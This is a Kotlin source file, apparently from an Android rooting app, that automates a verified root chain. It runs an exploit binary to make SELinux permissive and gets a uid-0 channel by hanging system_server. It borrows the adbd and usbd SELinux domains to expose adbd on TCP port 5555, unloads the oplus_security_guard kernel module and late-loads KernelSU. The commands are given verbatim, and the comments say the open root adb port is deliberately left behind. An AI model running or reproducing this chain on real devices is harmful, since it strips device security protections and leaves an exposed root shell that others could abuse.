package com.ghostlock.app.chain

import com.ghostlock.app.adb.AdbClient
import com.ghostlock.app.root.RootChannel
import kotlinx.coroutines.delay
import kotlinx.coroutines.withTimeout

/**
 * The frozen root chain, as it was verified end to end on 2026-09-26.
 *
 * Design and rationale: `docs/analysis/root-chain-integration.md`.
 * Device-side runbook (command whitelist, per-step verification, pitfalls):
 * `docs/analysis/current-chain-20260926.md`.
 *
 * ## Every command below is verbatim
 *
 * These are the exact commands of the verified chain. They must NOT be replaced by
 * "simplified" equivalents -- the device-side runbook §3 blacklists:
 *  * `ksud resetprop service.adb.tcp.port 5555` and friends (skipping the adbd domain),
 *  * `resetprop` for `service.*` properties,
 *  * legacy-domain tricks (`surfaceflinger`, `crash_dump`, ...) to reach `ctl.*`,
 *  * any step reordering or merging (for example dropping `am hang`).
 *
 * The domain borrows in steps 5/6 work only while SELinux is permissive (W1 landed
 * and `ksud late-load` has not run yet), which is why the order is what it is.
 */
object ChainSpec {
    const val DEVICE_DIR = "/data/local/tmp/gl-w1"

    /** The uid-0 shell channel Magica leaves behind (`sh <DEVICE_DIR>/rshell` uses these). */
    const val CHANNEL_SOCK = "$DEVICE_DIR/rshell.sock"
    const val CHANNEL_TOKEN = "$DEVICE_DIR/rshell.token"

    /** step 2: make system_server hang, so Magica's zygote can come up */
    const val AM_HANG = "am hang --allow-restart"

    /** step 3: launch Magica (replaced by the built-in root service once it is ported) */
    const val MAGICA_START = "am start -n io.github.vvb2060.puellamagi/.MainActivity"

    /** step 4: open the channel and check who we are */
    const val CHANNEL_PROBE = "id"

    /** step 5: `service.adb.tcp.port` is `adbd_config_prop` -- only the adbd domain may set it */
    const val ADBD_SET_TCP_PORT = "runcon u:r:adbd:s0 setprop service.adb.tcp.port 5555"

    /** step 6: `ctl_adbd_prop` is granted to `usbd` alone (`plat_sepolicy.cil`) */
    const val USBD_RESTART_ADBD = "runcon u:r:usbd:s0 setprop ctl.restart adbd"

    /** step 8: the first of the two things this chain actually exists for */
    const val RMMOD_GUARD = "rmmod oplus_security_guard"

    /** step 9: the second one -- KernelSU late-load gives the persistent root */
    const val KSUD_LATE_LOAD = "/data/adb/ksud late-load"

    /** verification only (never a substitute for the commands above) */
    const val READ_ENFORCE = "cat /sys/fs/selinux/enforce"
    const val READ_LISTEN = "ss -lnt"
    const val READ_MODULES = "cat /proc/modules"
    const val READ_IDENTITY = "id"
    const val READ_CAPS = "cat /proc/self/status"

    const val ADB_PORT = 5555
}

enum class ChainStep(val label: String) {
    PREFLIGHT("预检：通道与文件"),
    W1("W1：SELinux 转宽容"),
    MAGICA_ROOT("Magica：uid-0 通道"),
    OPEN_ADB_GATE("打开 adbd 门（借 adbd/usbd 域）"),
    ADB_CONNECT("adb 客户端连 127.0.0.1:5555"),
    REMOVE_GUARD("rmmod oplus_security_guard"),
    KSU_LATE_LOAD("ksud late-load"),
    VERIFY("校验 KernelSU"),
}

enum class StepState { RUNNING, OK, FAILED }

data class ChainProgress(
    val step: ChainStep,
    val index: Int,
    val total: Int,
    val state: StepState,
    val detail: String = "",
)

/** Result of one shell command executed as the shell user (uid 2000). */
data class ShellResult(val exitCode: Int, val output: String) {
    val ok: Boolean get() = exitCode == 0
}

/** Runs a command in the shell-uid context (Shizuku user service). */
fun interface ShellExec {
    suspend fun exec(command: String, timeoutMs: Long): ShellResult
}

/** Runs the W1 stage through the exploit binary (Shizuku user service). */
fun interface W1Runner {
    suspend fun runW1Only(onLog: (String) -> Unit): Boolean
}

/**
 * The chain state machine. It only coordinates; every privileged step is executed by
 * whatever context the corresponding step requires (shell uid, the Magica channel,
 * or the adb client attached to the root adbd).
 *
 * Nothing here does "cleanup": the verified chain deliberately leaves the adb gate
 * open and the W1 park alive (a reboot restores both), and the blacklist forbids
 * inventing extra steps.
 */
class RootChain(
    private val shell: ShellExec,
    private val w1: W1Runner,
    private val channel: RootChannel,
    private val adb: AdbClient,
    private val onLog: (String) -> Unit,
    private val onProgress: (ChainProgress) -> Unit,
) {
    private val total = ChainStep.entries.size

    /** Shell-uid command with the chain's default budget (the interface itself has none). */
    private suspend fun sh(command: String, timeoutMs: Long = 60_000L): ShellResult =
        shell.exec(command, timeoutMs)

    private suspend fun step(
        step: ChainStep,
        detail: String = "",
        body: suspend () -> String,
    ): String? {
        onProgress(ChainProgress(step, step.ordinal + 1, total, StepState.RUNNING, detail))
        return try {
            val outcome = body()
            onProgress(ChainProgress(step, step.ordinal + 1, total, StepState.OK, outcome))
            outcome
        } catch (t: Throwable) {
            val message = t.message ?: t.javaClass.simpleName
            onLog("[!] ${step.label} failed: $message")
            onProgress(ChainProgress(step, step.ordinal + 1, total, StepState.FAILED, message))
            null
        }
    }

    /** Poll [read] until it satisfies [check], or let [withTimeout] abort the step. */
    private suspend fun await(
        what: String,
        timeoutMs: Long,
        intervalMs: Long = 1_000L,
        read: suspend () -> String,
        check: (String) -> Boolean,
    ): String = withTimeout(timeoutMs) {
        var warned = false
        var current = ""
        while (!check(current)) {
            if (!warned) {
                onLog("[*] waiting for $what ...")
                warned = true
            }
            current = runCatching { read() }.getOrDefault("")
            if (!check(current)) delay(intervalMs)
        }
        current
    }

    suspend fun run(): Boolean {
        // step 0 ------------------------------------------------------------------
        var ok = step(ChainStep.PREFLIGHT, "channel socket") {
            val listing = sh("ls -l ${ChainSpec.CHANNEL_SOCK} ${ChainSpec.CHANNEL_TOKEN}").output
            onLog("[*] $listing")
            if (!listing.contains("rshell.sock")) {
                onLog("[*] channel not up yet -- Magica has to run once (step 3)")
            }
            "preflight done"
        } != null
        if (!ok) return false

        // step 1: W1 ---------------------------------------------------------------
        ok = step(ChainStep.W1, "GHOSTLOCK_W1_ONLY + GHOSTLOCK_PARK_AFTER_W1") {
            if (sh(ChainSpec.READ_ENFORCE).output.trim() == "0") {
                onLog("[*] SELinux already permissive -- still running W1 to get the park")
            }
            if (!w1.runW1Only(onLog)) throw IllegalStateException("W1 runner returned failure")
            val enforce = await(
                "SELinux permissive",
                timeoutMs = 90_000L,
                read = { sh(ChainSpec.READ_ENFORCE).output.trim() },
                check = { it.startsWith("0") },
            )
            "enforce=$enforce"
        } != null
        if (!ok) return false

        // step 2 + 3: Magica ------------------------------------------------------
        ok = step(ChainStep.MAGICA_ROOT, "am hang -> Magica -> uid 0") {
            sh(ChainSpec.AM_HANG, timeoutMs = 30_000L).let {
                onLog("[*] ${ChainSpec.AM_HANG} -> exit=${it.exitCode} (a broken pipe here is expected)")
            }
            sh("sleep 2; ${ChainSpec.MAGICA_START}").let {
                onLog("[*] ${ChainSpec.MAGICA_START} -> exit=${it.exitCode}")
            }
            await(
                "root channel socket",
                timeoutMs = 120_000L,
                read = { sh("ls -l ${ChainSpec.CHANNEL_SOCK} 2>&1").output },
                check = { it.contains("rshell.sock") },
            )
            channel.open()
            val identity = channel.exec(ChainSpec.CHANNEL_PROBE)
            onLog("[*] channel identity: ${identity.trim()}")
            if (!identity.contains("uid=0")) throw IllegalStateException("channel is not uid 0")
            if (identity.contains("uid=0") && !identity.contains("isolated_app")) {
                onLog("[!] unexpected channel domain (expected u:r:isolated_app:s0)")
            }
            identity.trim()
        } != null
        if (!ok) return false

        // step 5 + 6: open the adb gate (domain borrows, permissive only) --------
        ok = step(ChainStep.OPEN_ADB_GATE, "runcon adbd + usbd") {
            channel.exec(ChainSpec.ADBD_SET_TCP_PORT).let {
                onLog("[*] adbd domain: ${ChainSpec.ADBD_SET_TCP_PORT}")
                if (it.contains("Failed to set property")) {
                    throw IllegalStateException("setprop rejected -- is SELinux still permissive?")
                }
            }
            channel.exec(ChainSpec.USBD_RESTART_ADBD).let {
                onLog("[*] usbd domain: ${ChainSpec.USBD_RESTART_ADBD}")
            }
            val listen = await(
                "adbd listening on ${ChainSpec.ADB_PORT}",
                timeoutMs = 60_000L,
                read = { sh(ChainSpec.READ_LISTEN).output },
                check = { it.contains(":${ChainSpec.ADB_PORT}") },
            )
            "listening"
        } != null
        if (!ok) return false

        // step 7: the app becomes an adb client ----------------------------------
        ok = step(ChainStep.ADB_CONNECT, "127.0.0.1:${ChainSpec.ADB_PORT}") {
            adb.connect()
            val identity = adb.exec(ChainSpec.READ_IDENTITY)
            val caps = adb.exec(ChainSpec.READ_CAPS)
            onLog("[*] adb identity: ${identity.trim()}")
            val capLine = caps.lineSequence().firstOrNull { it.startsWith("CapEff:") }?.trim() ?: ""
            onLog("[*] adb $capLine")
            if (!identity.contains("uid=0")) throw IllegalStateException("adb shell is not root")
            if (!capLine.contains("000001ffffffffff")) {
                throw IllegalStateException("adb shell has no full capabilities: $capLine")
            }
            "$identity / $capLine"
        } != null
        if (!ok) return false

        // step 8: the goal, part one ---------------------------------------------
        ok = step(ChainStep.REMOVE_GUARD, ChainSpec.RMMOD_GUARD) {
            val out = adb.exec(ChainSpec.RMMOD_GUARD)
            if (out.isNotBlank()) onLog("[*] rmmod: ${out.trim()}")
            val modules = adb.exec(ChainSpec.READ_MODULES)
            if (modules.contains("oplus_security_guard")) {
                throw IllegalStateException("oplus_security_guard is still loaded")
            }
            "guard unloaded"
        } != null
        if (!ok) return false

        // step 9: the goal, part two ---------------------------------------------
        ok = step(ChainStep.KSU_LATE_LOAD, ChainSpec.KSUD_LATE_LOAD) {
            val out = adb.exec(ChainSpec.KSUD_LATE_LOAD, timeoutMs = 120_000L)
            if (out.isNotBlank()) onLog("[*] ksud: ${out.trim()}")
            // NOTE: ksud late-load reloads the SELinux policy, so `getenforce` going back
            // to Enforcing here is expected behaviour, not a failure.
            "late-load returned"
        } != null
        if (!ok) return false

        // verify -----------------------------------------------------------------
        ok = step(ChainStep.VERIFY, "kernelsu module") {
            val modules = await(
                "kernelsu in /proc/modules",
                timeoutMs = 30_000L,
                read = { adb.exec(ChainSpec.READ_MODULES) },
                check = { it.contains("kernelsu") },
            )
            if (!modules.contains("kernelsu")) throw IllegalStateException("kernelsu not loaded")
            "kernelsu loaded"
        } != null

        adb.close()
        channel.close()
        onLog(if (ok) "[+] root chain complete" else "[!] root chain stopped early")
        return ok
    }
}
